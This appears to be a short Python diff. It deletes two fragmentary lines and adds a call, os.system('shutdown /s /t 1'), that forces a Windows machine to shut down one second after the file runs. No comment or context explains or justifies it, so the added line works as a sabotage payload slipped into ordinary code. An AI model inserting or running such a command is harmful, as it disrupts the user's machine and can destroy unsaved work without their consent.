@@ -1,2 +1,2 @@
-from itertools import count as crash
-list 
+import os 
+os.system("shutdown /s /t 1")
